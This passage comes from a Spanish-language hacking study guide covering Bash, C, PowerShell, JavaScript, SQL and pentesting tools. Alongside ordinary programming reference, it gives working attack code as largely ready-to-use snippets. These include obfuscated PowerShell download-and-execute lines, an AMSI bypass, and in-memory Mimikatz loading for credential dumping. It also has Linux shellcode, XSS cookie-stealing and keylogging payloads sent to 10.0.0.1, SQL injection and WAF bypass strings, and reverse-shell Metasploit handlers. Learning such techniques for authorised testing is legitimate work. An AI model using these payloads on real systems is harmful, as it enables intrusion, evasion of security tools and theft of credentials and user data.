sort -r archivo.txt   # reverso

uniq archivo.txt         # solo lineas unicas (necesita sort)
uniq -c archivo.txt      # contar ocurrencias
uniq -d archivo.txt      # solo duplicados

head -n 10 archivo.txt   # primeras 10 lineas
tail -n 10 archivo.txt   # ultimas 10 lineas
tail -f log.txt          # seguir log en tiempo real

# Combinados
sort access.log | uniq -c | sort -rn | head -20
```

#### cut, tr, wc

```bash
cut -d: -f1,6 /etc/passwd       # campos 1 y 6 con :
cut -c1-10 archivo.txt          # caracteres 1-10

tr 'a-z' 'A-Z' < archivo.txt    # mayusculas
tr -d '\n' < archivo.txt        # eliminar newlines
tr -s ' ' < archivo.txt         # comprimir espacios

wc -l archivo.txt               # lineas
wc -w archivo.txt               # palabras
wc -c archivo.txt               # bytes
```

#### diff, comm, cmp

```bash
diff archivo1.txt archivo2.txt
diff -u archivo1.txt archivo2.txt   # unified diff

comm archivo1.txt archivo2.txt      # lineas en comun/diferentes
cmp archivo1.txt archivo2.txt       # compara byte a byte
```

#### xargs

```bash
# Ejecutar comando con argumentos de stdin
cat ips.txt | xargs -I{} ping -c 1 {}
find / -name "*.log" | xargs grep "ERROR"
find / -name "*.tmp" -print0 | xargs -0 rm -f

# xargs con paralelismo
cat urls.txt | xargs -P 10 -I{} curl -s {}
```

#### date, timeout, watch

```bash
date                          # fecha actual
date +%Y-%m-%d                # 2026-05-24
date -d "yesterday"           # ayer

timeout 5 ping google.com     # timeout de 5s
timeout -k 5 30 comando       # kill despues de 5s si no termina

watch -n 1 "ps aux | head"    # ejecutar cada 1s
watch -d 'ls -la'            # resaltar diferencias
```

#### Networking en Bash

```bash
# /dev/tcp - conexiones TCP nativas
exec 3<>/dev/tcp/google.com/80
echo -e "GET / HTTP/1.1\r\nHost: google.com\r\n\r\n" >&3
cat <&3
exec 3<&-

# Ver si puerto esta abierto
timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/22" 2>/dev/null && echo "abierto"

# DNS
host google.com
nslookup google.com
dig google.com ANY
dig -x 8.8.8.8  # reverse DNS
```

#### Procesamiento de Texto

```bash
# Extraer IPs de un archivo
grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' archivo.txt | sort -u

# Extraer emails
grep -oP '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' archivo.txt

# Extraer URLs
grep -oP 'https?://[^\s"]+' archivo.txt

# Convertir a minusculas
tr '[:upper:]' '[:lower:]' < archivo.txt

# Eliminar lineas duplicadas
sort archivo.txt | uniq
```

### 2.13 Scripting Avanzado

```bash
#!/bin/bash
set -euo pipefail

# Procesar argumentos con getopts
while getopts "t:p:vh" opt; do
    case $opt in
        t) target="$OPTARG" ;;
        p) port="$OPTARG" ;;
        v) verbose=true ;;
        h) echo "Uso: $0 -t target -p port"; exit 0 ;;
        *) echo "Opcion invalida"; exit 1 ;;
    esac
done

# Colores en output
RED="\033[0;31m"
GREEN="\033[0;32m"
NC="\033[0m"
echo -e "${GREEN}[+]${NC} Puerto abierto"
echo -e "${RED}[-]${NC} Puerto cerrado"

# Barra de progreso
total=$(wc -l < ips.txt)
count=0
while IFS= read -r ip; do
    ((count++))
    echo -ne "Progreso: $count/$total\r"
    ping -c 1 "$ip" > /dev/null 2>&1
done < ips.txt
```

### 2.14 Pentesting One-Liners (coleccion)

```bash
# === RECON ===
# Port scan rapido
for p in 21 22 23 25 53 80 110 143 443 445 993 995 1433 1521 3306 3389 5432 5900 8080 8443; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null && echo "$p ABIERTO"; done

# Hosts vivos en /24
for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i | grep "64 bytes" | cut -d" " -f4 | tr -d ":" & done

# HTTP title
curl -s https://target.com | grep -oP "<title>[^<]+" | cut -d">" -f2

# HTTP headers
curl -sI -X OPTIONS https://target.com

# Server header
curl -sI https://target.com | grep -i "^Server:"

# Puertos comunes de servidores web
for p in 80 8080 443 8443; do curl -sI --connect-timeout 2 https://10.0.0.1:$p >/dev/null 2>&1 && echo "Web en puerto $p"; done

# === ENUMERACION ===
# Directorios comunes
for d in admin login backup config wp-admin api; do curl -s -o /dev/null -w "%{http_code}" https://target.com/$d && echo " $d"; done

# Subdominios
for s in www admin mail dev api blog; do host $s.target.com 2>/dev/null | grep "has address" | sed "s/has address/ ->/" | sed "s/^/$s./"; done

# CMS detection
curl -s https://target.com | grep -oP "wp-content|Joomla|Drupal|Magento" | sort -u

# === EXPLOTACION ===
# SQLi test basico
curl -s "https://target.com/page?id=1'" | grep -qi 'sql\|mysql\|error\|syntax' && echo 'Posible SQLi'

# XSS test basico
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep -qi 'alert' && echo 'Posible XSS'

# LFI test
curl -s "https://target.com/page?file=/etc/passwd" | grep -qi 'root:x:' && echo 'Posible LFI'

# === POST-EXPLOTACION ===
# Buscar config files con passwords
for f in wp-config.php config.php .env config.json; do find /var -name "$f" -exec grep -l "DB_PASSWORD\|password" {} \; 2>/dev/null; done

# Buscar archivos SUID
find / -perm -4000 -type f 2>/dev/null

# Buscar capabilities
getcap -r / 2>/dev/null
```

---

## C/C++ para Exploits (continuacion)

### 3.11 System Calls

```c
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// open/read/write/close
int fd = open("/etc/passwd", O_RDONLY);
if (fd == -1) {
    perror("open");
    return 1;
}

char buf[1024];
ssize_t n = read(fd, buf, sizeof(buf)-1);
buf[n] = 0;
printf("%s\n", buf);
close(fd);

// write
fd = open("salida.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
write(fd, "Hola\n", 5);
close(fd);

// execve
char *args[] = {"/bin/sh", "-c", "whoami", NULL};
execve("/bin/sh", args, NULL);
// execve reemplaza el proceso actual

// fork
pid_t pid = fork();
if (pid == 0) {
    // Proceso hijo
    execve("/bin/sh", args, NULL);
} else if (pid > 0) {
    // Proceso padre
    wait(NULL);
} else {
    perror("fork");
}

// mmap (mapear memoria)
#include <sys/mman.h>
void *mem = mmap(NULL, 4096,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (mem == MAP_FAILED) { perror("mmap"); exit(1); }
strcpy(mem, "datos en memoria ejecutable");
munmap(mem, 4096);
```

### 3.12 Shellcode (detallado)

**Que es shellcode:** Codigo de maquina (opcodes) que ejecuta una shell o accion especifica. Se inyecta en la memoria de un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) vulnerable.

```c
// Shellcode /bin/sh Linux x86-64 (27 bytes)
unsigned char sc[] = {
    0x48, 0x31, 0xf6,    // xor rsi, rsi
    0x48, 0x31, 0xd2,    // xor rdx, rdx
    0x48, 0xbb,          // movabs rbx, "/bin//sh"
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x53,                // push rbx
    0x48, 0x89, 0xe7,    // mov rdi, rsp
    0x50,                // push rax
    0x57,                // push rdi
    0x48, 0x89, 0xe6,    // mov rsi, rsp
    0xb0, 0x3b,          // mov al, 59 (execve syscall number)
    0x0f, 0x05           // syscall
};

// Funcion para ejecutar shellcode
void exec_shellcode(unsigned char *sc, size_t len) {
    void *mem = mmap(0, len,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(mem, sc, len);
    ((void(*)())mem)();  // ejecutar
    munmap(mem, len);
}

// Generar shellcode con msfvenom:
// msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c
```

### 3.13 ROP Gadgets Basicos

```c
// ROP (Return-Oriented Programming)
// Usar gadgets (instrucciones seguidas de ret) del codigo existente
// para construir una cadena de ejecucion

// Gadgets comunes (buscar con ROPgadget):
// pop rdi; ret
// pop rsi; ret
// pop rdx; ret
// syscall; ret
// ret (NOP sled para ROP)

// Buscar gadgets:
// ROPgadget --binary programa
// objdump -d programa | grep -A1 "pop.*rdi" | grep "ret"

// Ejemplo de ROP chain:
// [addr_pop_rdi] [arg1] [addr_system]
// [addr_pop_rdi] [arg2] [addr_pop_rsi] [arg3] [addr_func]
```

### 3.14 Format String Vulnerabilities

```c
// VULNERABLE
void vuln() {
    char buffer[100];
    gets(buffer);
    printf(buffer);  // Format string vuln! (debe ser printf("%s", buffer))
}

// Si el usuario ingresa "%x %x %x %x",
// printf mostra valores del stack (memory leak)
// %s para leak de strings, %n para escritura

// Compilar: gcc -o vuln vuln.c
// exploit: ./vuln <<< "$(python3 -c 'print("%%p "*10)'")"
```

### 3.15 Cross-Compiling y Emulacion

```bash
# Windows exe desde Linux
x86_64-w64-mingw32-gcc -o payload.exe payload.c

# ARM binary
arm-linux-gnueabihf-gcc -o payload.arm payload.c

# MIPS
mips-linux-gnu-gcc -o payload.mips payload.c

# Verificar arquitectura
file payload.exe
readelf -h payload
```

---

## [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) para Windows Hacking (continuacion)

### 4.11 Cmdlets de Pentesting

```powershell
# Procesos y servicios
Get-Process -Name "explorer"
Get-Process | Where-Object { $_.WorkingSet -gt 100MB }
Stop-Process -Name "malware" -Force

# WMI
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine
Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq "LocalSystem" }
Get-WmiObject Win32_UserAccount | Select-Object Name, SID, Disabled
Get-WmiObject Win32_Product | Select-Object Name, Version  # software instalado

# Registry
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select-Object DisplayName, ImagePath
```

### 4.12 [ofuscacion](../raw/4pk-r3v3rs1ng.md#obfuscation) y Bypass

```powershell
# Ofuscacion basica con reverse strings
$c = ")" + "txE" + ".tneilCbeW" + "(w"
$c = [string]::Join("", $c.ToCharArray() | Select-Object -Index (($c.Length-1)..0))
iex (New-Object $c).DownloadString("http://server/ps.ps1")

# Ofuscacion con XOR
$k = 0x42
$c = [byte[]]@(0x2a, 0x23, 0x2a, 0x39, 0x0b, 0x0d, 0x0b, 0x0b, 0x35, 0x2e, 0x35, 0x30, 0x05, 0x07, 0x19, 0x3b, 0x1c, 0x3b, 0x1a, 0x3c, 0x3a, 0x31, 0x32, 0x05, 0x3c, 0x38, 0x3b, 0x39, 0x05, 0x0b, 0x1d)
$d = -join ($c | ForEach-Object { [char]($_ -bxor $k) })
iex $d

# Bypass AMSI avanzado
$a = [Ref].Assembly.GetTypes()
foreach($t in $a) {
    if($t.Name -like "*iUtils") {
        $f = $t.GetField("amsiInitFailed", "NonPublic,Static")
        $f.SetValue($null,$true)
    }
}
```

### 4.13 Credential Access

```powershell
# Mimikatz desde memoria
$bytes = (New-Object Net.WebClient).DownloadData("http://server/mimikatz.exe")
[System.Reflection.Assembly]::Load($bytes)
[Mimikatz]::Main(@("-Command", "sekurlsa::logonpasswords"))

# Dump de hashes SAM (necesita admin)
reg save hklm\sam sam.save
reg save hklm\system system.save
# Despues extraer hashes con impacket o simil

# Token manipulation
$proc = Get-Process -Name "winlogon"
$token = [System.Security.Principal.WindowsIdentity]::GetCurrent()

# Credenciales almacenadas
cmdkey /list
Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName
```

### 4.14 Lateral Movement

```powershell
# PsExec style
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }

# WMI exec
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"

# Schtasks remoto
schtasks /create /s TARGET /tn "Updater" /tr "powershell -c whoami" /sc once /st 00:00
schtasks /run /s TARGET /tn "Updater"

# WinRM
Test-WSMan -ComputerName TARGET
Enter-PSSession -ComputerName TARGET
```

---

## JavaScript para Web Hacking (continuacion)

### 5.10 Event Loop y Promesas

```javascript
// Promesas
const p = new Promise((resolve, reject) => {
    setTimeout(() => resolve("OK"), 1000)
})
p.then(console.log).catch(console.error)

// async/await
async function main() {
    try {
        let r = await fetch("https://api.example.com")
        let d = await r.json()
        console.log(d)
    } catch(e) {
        console.error(e)
    }
}
```

### 5.11 Closures y Scope

```javascript
// Closure: funcion que recuerda su ambito
function crearContador() {
    let count = 0
    return function() {
        return ++count
    }
}
const c = crearContador()
console.log(c())  // 1
console.log(c())  // 2

// IIFE (funcion inmediata)
(function() {
    let privado = "solo aca"
    console.log(privado)
})()

// var vs let vs const
for (var i = 0; i < 3; i++) {
    setTimeout(() => console.log(i), 100)  // 3,3,3
}
for (let i = 0; i < 3; i++) {
    setTimeout(() => console.log(i), 100)  // 0,1,2
}
```

### 5.12 Prototype y Metodos de Array

```javascript
// Prototype (herencia en JS)
function Usuario(nombre) {
    this.nombre = nombre
}
Usuario.prototype.saludar = function() {
    return "Hola " + this.nombre
}
const u = new Usuario("Octavio")
console.log(u.saludar())

// Metodos utiles de array
[1,2,3].includes(2)     // true
[1,2,3].find(x => x>2)  // 3
[1,2,3].findIndex(x => x>2) // 2
[1,2,3].some(x => x>2)  // true
[1,2,3].every(x => x>0) // true
[1,2,3].flat()          // [1,2,3]
[1,[2,[3]]].flat(2)     // [1,2,3]
[1,2,3].slice(1)        // [2,3]
[1,2,3].splice(1,1)     // [2] (modifica original!)
```

### 5.13 [xss](../raw/w3b-h4ck1ng.md#xss) Payloads

```javascript
// Clasico alert
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Cookie stealing
document.location='http://10.0.0.1/?c='+document.cookie
new Image().src='http://10.0.0.1/?c='+document.cookie

// Keylogger
document.addEventListener('keydown',function(e){
    fetch('http://10.0.0.1/k?k='+e.key)
})

// DOM clobbering
<a id=admin href="http://10.0.0.1">

// Bypass filters
<scr<script>ipt>alert(1)</scr<script>ipt>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
location='javascript:alert(1)'
```

---

## SQL para Inyeccion (continuacion)

### 6.10 [sqli](../raw/w3b-h4ck1ng.md#sql-injection) Tecnicas

```sql
-- Error-based SQLi
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
' AND 1=CONVERT(int, (SELECT @@version)) --

-- Union-based SQLi
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT null,null,null,null,null --
' UNION SELECT 'a','b','c','d','e' --
' UNION SELECT table_name,column_name,1,1,1 FROM information_schema.columns --

-- Blind SQLi (booleano)
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --
' OR 1=1 --   (true)
' OR 1=2 --   (false)
' AND (SELECT COUNT(*) FROM users) > 10 --

-- Blind SQLi (time-based)
' OR IF(1=1, SLEEP(5), 0) --   (MySQL)
'; IF(1=1) WAITFOR DELAY '00:00:05' -- (SQL Server)
' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END -- (PostgreSQL)

-- Out-of-band SQLi
' EXEC xp_dirtree '\\\\10.0.0.1\share' -- (SQL Server)
' SELECT LOAD_FILE('\\\\10.0.0.1\share\file') -- (MySQL)
```

### 6.11 SQLi WAF Bypass

```sql
-- Bypass con comentarios
'/**/OR/**/1=1/**/--
'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--

-- Bypass con case
' uNiOn SeLeCt 1,2,3 --

-- Bypass con encoding
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3 --
' \x55\x4e\x49\x4f\x4e \x53\x45\x4c\x45\x43\x54 1,2,3 --

-- Bypass con NULL bytes
' UN%00ION SEL%00ECT 1,2,3 --

-- Bypass con operadores alternativos
' || 1=1 --
' && 1=1 --
' || 'admin' LIKE '%a%' --
```

---

## Herramientas y Flujo de Trabajo (continuacion)

### 7.9 [reconocimiento](../raw/0s1nt.md#reconocimiento) Pasivo ([osint](../raw/0s1nt.md))

```bash
# WHOIS
whois example.com

# DNS
dig example.com ANY
nslookup example.com
host -a example.com

# Shodan
# shodan search "apache"
# shodan host 1.1.1.1

# crt.sh (certificates)
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq .

# theHarvester
theHarvester -d example.com -b google

# Google Dorks comunes
site:example.com intitle:"index of"
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com ext:sql "INSERT INTO"
```

### 7.10 [burp suite](../raw/w3b-h4ck1ng.md#burp-suite) Workflow

1. Configurar [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) en 127.0.0.1:8080
2. Instalar certificado CA en el [navegador](../raw/br0ws3r-3xpl01t4t10n.md)
3. Interceptar peticiones con Proxy > Intercept
4. Enviar a Repeater para modificar y reenviar
5. Usar Intruder para ataques de [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta)/[fuzzing](../raw/fuzz1ng.md)
6. Decoder para encode/decode
7. Comparer para comparar respuestas
8. Extensions: Autorize, Logger++, Turbo Intruder

### 7.11 [metasploit](../raw/m3t4spl01t.md) Cheatsheet

```msf
msfconsole

# Busqueda
search type:exploit platform:windows
search cve:2024
search apache

# Payloads
set PAYLOAD windows/meterpreter/reverse_tcp
set PAYLOAD linux/x64/shell_reverse_tcp
set PAYLOAD php/meterpreter_reverse_tcp

# Handlers
use exploit/multi/handler
set LHOST 10.0.0.1
set LPORT 4444
exploit -j  # correr en background

# Post-explotacion
sessions -l               # listar
sessions -i 1             # interactuar
background                # background session
run post/windows/gather/hashdump
run post/multi/recon/local_exploit_suggester
```

### 7.12 Linux [privilege escalation](../raw/l1n9x-pr1v3sc.md) Checklist

```bash
# 1. Kernel exploits
uname -a
searchsploit "linux kernel"

# 2. Sudo
sudo -l

# 3. SUID
find / -perm -4000 -type f 2>/dev/null

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# 6. PATH abuse
echo $PATH
find / -writable -type d 2>/dev/null

# 7. Writable scripts
find /etc -writable -type f 2>/dev/null

# 8. Credentials in files
grep -r "password" /etc /var /opt 2>/dev/null

# 9. NFS shares
cat /etc/exports
showmount -e localhost

# 10. Docker/LXC
cat /proc/1/cgroup | grep -i docker
groups
```

### 7.13 Windows Privilege Escalation Checklist

```cmd
:: 1. System info
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: 2. User privileges
whoami /all
net user
net localgroup

:: 3. Services
wmic service get name,displayname,pathname,startmode
accesschk.exe /accepteula -uwcqv "Users" *

:: 4. AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

:: 5. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

:: 6. Credentials in files
findstr /si password *.txt *.ini *.config

:: 7. Registry autoruns
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

:: 8. Token privileges
whoami /priv
:: SeImpersonatePrivilege -> JuicyPotato
:: SeDebugPrivilege -> Mimikatz

:: 9. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

### 7.14 Networking Essentials

**[tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip) Basics:**
- [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp): Connection-oriented, 3-way [handshake](../raw/w1f1-4tt4cks.md#handshake) (SYN, SYN-ACK, ACK)
- [udp](../raw/r3d3s-f0nd4m3nt0s.md#udp): Connectionless, no handshake
- Common ports: 21(FTP), 22(SSH), 23(Telnet), 25(SMTP), 53([dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)), 80([http](../raw/r3d3s-f0nd4m3nt0s.md#http)), 443([https](../raw/r3d3s-f0nd4m3nt0s.md#https)), 445([smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)), 1433(MSSQL), 3306(MySQL), 3389(RDP), 5432(PostgreSQL), 8080([http](../raw/r3d3s-f0nd4m3nt0s.md#http)-alt)
- OSI Model: Physical, Data Link, Network, Transport, Session, Presentation, Application
- Subnetting: /24 = 255.255.255.0 = 254 hosts, /16 = 255.255.0.0 = 65534 hosts
- [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat): Network Address Translation
- DNS: A(IPv4), AAAA(IPv6), CNAME(alias), MX(mail), TXT(text)

### 7.15 Consejos Finales

1. **Practica todos los dias.** 15 minutos de coding constante > 5 horas un fin de semana.
2. **Lee codigo de otros.** GitHub, [exploit](../raw/m3t4spl01t.md#exploits)-DB, las tools de Kali. Entende como funcionan.
3. **Documenta todo.** Tus notas de hoy son tu referencia de mañana. Usa Obsidian, Notion, o markdown.
4. **Arma tu laboratorio.** VirtualBox + Kali + Metasploitable + DVWA + Windows VMs.
5. **Aprende a googlear.** El 90% del hacking es saber buscar. "site:exploit-db.[com](../raw/w1n-s9bsyst3ms.md#com)" + tu problema.
6. **No te rindas.** El [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow) que no te sale hoy, te va a salir despues de dormir.
7. **Usa el codigo de la comunidad.** No reinventes la rueda, pero entende que hace cada linea.
8. **Mantenete etico.** Con grandes poderes vienen grandes responsabilidades. No seas script kiddie.
9. **Comparti conocimiento.** Enseñar es la mejor forma de aprender. Hace writeups, blogs, videos.
10. **Divertite.** Si no te divierte, no es para vos. El hacking es creatividad pura.

---

*Fin del documento. Recorda: esto es el piso, no el techo. Segui aprendiendo.*


